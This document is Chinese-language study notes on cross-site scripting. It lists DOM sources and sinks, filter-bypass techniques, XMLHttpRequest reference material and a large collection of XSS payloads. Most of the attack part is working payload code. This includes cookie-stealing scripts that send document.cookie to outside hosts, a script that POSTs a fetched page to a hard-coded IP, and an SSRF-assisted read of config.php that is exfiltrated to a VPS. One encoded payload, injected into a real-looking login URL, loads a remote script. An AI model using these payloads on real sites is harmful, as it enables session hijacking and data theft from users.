# xss

## ssrf

[利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)



## 不同的xss类型

### 反射型xss

### 储存型xss

### dom xss

客户端产生xss

测试技巧:关注输入和输出

**输入:**

document.URL

document.URLUnencoded

document.location

document.referrer

document.xxxx

window.location

window.name

window.xxxxxx

**输出:**

document.write()

document.writeln()

document.body.innerHtml=...

document.forms[0].action=...

document.attachEvent(...)

document.create...(...)

document.execCommand(...)

document.body. ...

window.attachEvent(...)

document.location=...

document.location.hostname=...

document.location.replace(...)

document.location.assign(...)

document.URL=...

window.navigate(...)

document.open(...)

window.open(...)

window.location.href=...

eval(...)

window.execScript(...)

window.setInterval(...)

window.setTimeout(...)







## xss cheat sheet

http://ha.ckers.org/xss.html

https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45

## 绕过xss-filter

### html标签属性执行xss

属性:href,lowsrc,src,bgsound,background,value,action,dynsry

### 空格回车,tab

原理:javascript 引擎对语句的解析

```html
<img src="javas
          cript:
          alert(0)"
```

### 对标签属性值的转码

html中属性值本身支持ascii码格式

```html
<img src="javascript:alert(/xss/)">
变为
<img src="javascript&#116&#58alert(/xss/)">
将&#116变为&#000000116也行
还可以将&#01,&#02等支付插入到javascript或vbscript头部
```

### 产生自己的事件

onerror,onerror

### 利用css跨站攻击

```css
<div style="background-image:url(javascript:alert('xss'))"
<style>
body{
    background-image:url("javascript:alert('xss')")
}
</style>
<div style="width:expression(alert('xsss'));">
<style>
@import 'javascript:alert()'
</style>
```

加载css的方式:

- link标签
  `<link rel="stylesheet" href="xxxx.css">`
- @import
  `<style type='text/css'>@import url(xxxx.css);</style>`

### 扰乱过滤规则

```html
<img/src="mar.png" alt="mars">
    样式标签中的/**/和\和\0会被浏览器忽略
    <img src="java/*exp/**/script:alert();*/ression(alert(0))">
    @\i\0m\00p\0000\0000\00000r\000000t "url"
   将css中的关键字进行转码处理,如将e转换成\65
    <p style="xss:\0065xpression(alert(/xss/))">
        
   样式表也支持分析和解释\连接的16进制字符串形式
        <style>BODY{background:\75\72\6c....}</style>
```



## Ajax

Ajax:"异步的javascript和xml",可以不必重新加载网页,而访问其他内容,对于csrf和ssrf都相当有用

### javascript常用函数

#### array.indexof()

#### string.substring()



### XMLHttpRequest对象

获取XMLHttpRequest对象通用代码

```javascript
xmlhttp=false;
function getXMLHttpRequest()
{
    if(window.XMLHttpRequest)
        xmlhttp=new XMLHttpRequest();
    else
    {
    	try
        {
            xmlhttp=new ActiveXObject("Msxml2.XMLHTTP")
        }
        catch (e)
        {
            try
            {
                xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
            }
            catch (e)
            {
                xmlhttp=new false;
            }
        }
    }
}
```

#### XMLHttpRequest对象的方法

- [`XMLHttpRequest.abort()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/abort)

  如果请求已被发送，则立刻中止请求。

- [`XMLHttpRequest.getAllResponseHeaders()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getAllResponseHeaders)

  以字符串的形式返回所有用 [CRLF](https://developer.mozilla.org/en-US/docs/Glossary/CRLF) 分隔的响应头，如果没有收到响应，则返回 `null`。

- [`XMLHttpRequest.getResponseHeader("header")`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getResponseHeader)

  返回包含指定响应头的字符串，如果响应尚未收到或响应中不存在该报头，则返回 `null`。

- [`XMLHttpRequest.open("method","url"[,async,username,password])`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/open)

  初始化一个请求。该方法只能在 JavaScript 代码中使用，若要在 native code 中初始化请求，请使用 [`openRequest()`](https://developer.mozilla.org/zh-CN/docs/Mozilla/Tech/XPCOM/Reference/Interface/nsIXMLHttpRequest)。

- [`XMLHttpRequest.overrideMimeType()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/overrideMimeType)

  重写由服务器返回的 MIME 类型。

- [`XMLHttpRequest.send()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/send)

  发送请求。如果请求是异步的（默认），那么该方法将在请求发送后立即返回。

- [`XMLHttpRequest.setRequestHeader()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/setRequestHeader)

  设置 HTTP 请求头的值。您必须在 `open()` 之后、`send()` 之前调用 `setRequestHeader()`方法。

#### XMLHttpRequest对象属性

[`XMLHttpRequest.onreadystatechange`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/onreadystatechange)

当 readyState 属性发生变化时调用的 [`EventHandler`](https://developer.mozilla.org/zh-CN/docs/Web/API/EventHandler)。

[`XMLHttpRequest.readyState`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/readyState) 只读

返回 一个无符号短整型（unsigned short）数字，代表请求的状态码。

[`XMLHttpRequest.response`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/response) 只读

返回一个 [`ArrayBuffer`](https://developer.mozilla.org/zh-CN/docs/Web/API/ArrayBuffer)、[`Blob`](https://developer.mozilla.org/zh-CN/docs/Web/API/Blob)、[`Document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)，或 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，具体是哪种类型取决于 [`XMLHttpRequest.responseType`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseType) 的值。其中包含整个响应体（response body）。

[`XMLHttpRequest.responseText`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseText) 只读

返回一个 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，该 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString) 包含对请求的响应，如果请求未成功或尚未发送，则返回 `null`。

[`XMLHttpRequest.responseType`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseType)

一个用于定义响应类型的枚举值（enumerated value）。

[`XMLHttpRequest.responseURL`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseURL) 只读

返回响应的序列化（serialized）URL，如果该 URL 为空，则返回空字符串。

[`XMLHttpRequest.responseXML`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseXML) 只读

返回一个 [`Document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)，其中包含该请求的响应，如果请求未成功、尚未发送或时不能被解析为 XML 或 HTML，则返回 `null`。

[`XMLHttpRequest.status`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/status) 只读

返回一个无符号短整型（unsigned short）数字，代表请求的响应状态。

[`XMLHttpRequest.statusText`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/statusText) 只读

返回一个 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，其中包含 HTTP 服务器返回的响应状态。与 [`XMLHTTPRequest.status`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHTTPRequest/status) 不同的是，它包含完整的响应状态文本（例如，"`200 OK`"）。

#### 利用XMLHttpRequest对象读取网页并发送到远程服务器

```javascript
 <script language="javascript">
        var xmlhttp;
        function getXMLHttpRequest()
        {
            if(window.XMLHttpRequest)
                xmlhttp=new XMLHttpRequest();
            else
            {
                try
                {
                    xmlhttp=new ActiveXObject("Msxml2.XMLHTTP")
                }
                catch (e)
                {
                    try
                    {
                        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
                    }
                    catch (e)
                    {
                        xmlhttp=new false;
                    }
                }
            }
        }
        function send_info_to_remote(xmlhttp)
        {
            var res=xmlhttp.responseText;
            getXMLHttpRequest();
            xmlhttp.open("POST","http://39.108.164.219:60000",true);
            xmlhttp.onreadystatechange=proccessResponse;
            xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            xmlhttp.send(String(res));
            }
        function proccessResponse()
        {
            if(xmlhttp.readyState==4)
            {
                if(xmlhttp.status==200)
                {
                    send_info_to_remote(xmlhttp);
                }else window.alert("error");
            }
        }
        getXMLHttpRequest();
        xmlhttp.open("GET","http://127.0.0.1/1.html",true);
        xmlhttp.onreadystatechange=proccessResponse;
        xmlhttp.send();
        </script>
```



## 运用dom技术

```javascript
document.getElementById
document.getElementsByName
document.getElementsByTagName
document.getElementsByTagName("h1")[0].getAttribute("id");
document.getElementsByTagName("h1")[0].setAttribute("value","yourname");
document.createAttribute//结合appendChild利用
document.body.appendChild
```



## 常用的xss语句

读cookie:document.location='http://ip或域名/?'+document.cookie

读源码:document.location='http://ip或域名/?'+btoa(document.body.innerHTML)

### 访问网页

```javascript
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///var/www/html/config.php");
```

### 重定向

` document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);`



## **反射型XSS Poc:**

 

**alert()函数过滤：**

```
<script>alert('xss')</script> 
<script>confirm('xss')</script> 
<script>prompt('xss')</script> 
```

 

<script>标签过滤：

```
<a href="onclick=alert('xss')"> click</a>123"><a/href=//www.baidu.com/>XssTest</a>
<img src=# onerror=alert('xss')></img>
<iframe onload=alert('xss')>
```

 

**base64加密**

```
<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>
```

 

**setTimeout**

```
<svg/onload=setTimeout('ale'+'rt(1)',0)>
```

 

**过滤双引号**

```
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
```

 

**chrome**

```
<img src ?itworksonchrome?\/onerror = alert(1)>
```

 

**data形式**

```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></object>
<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></embed>
<script src=data:%26comma;alert(1)></script>
```

 

**ontoggle**

```
<details open ontoggle="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#24050;&#26159;&#40644;&#26127;&#29420;&#33258;&#24833;&#65292;&#19968;&#26525;&#32418;&#26447;&#20986;&#22681;&#26469;&#39;&#41;">
```

 

**frame**

```
<frame src="javascript:alert(1)">
<frame src="javascript:%20%0aalert%20%0d %09(1)">
<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />2134'></textarea><script>alert(/xss/)</script><textarea>
```

 

**url加密绕圆括号**

```
<svg/onload=alert(1)>
<svg onload='JavascRipT:alert%281%29'>
<svg/onload ="location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'">
```

 

 **XSS漏洞利用方式：**



```
<script>window.location="http://www.baidu.com"</script>   重定向钓鱼
<script>window.location="http://1.1.1.1/cookie.php?cookie="+document.cookie;</script>  接受客户端cookie
<script>new Image().src="http://1.1.1.1/c.php?output="+document.cookie; </script> http://login.xxx.com/sso/m/mobile-login.do?next_page=http://m.xxx.com&f=coursek12xss",}});setTimeout(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9Jy8vZHQzMDEuY29tLzAuanMnOw=='),0);({validate: {//
```

## 利用php语言特性

### php

$_SERVER['PHP_SELF']

其中PHP_SELF可以换为:SCRIPT_URI,QUERY_STRING,PATH_INFO等

例子:

```php
<form method="POST" action="<?php echo $_SERVER('PHP_SELF')?>">
</form>
```



exp:

`http://127.0.0.1/1.php/%22%3e%3cscript%3ealert('xss')%3c/script%3e%3cfoo`



## xss工具

xss-proxy,xssshell,attackapi,anehta,avws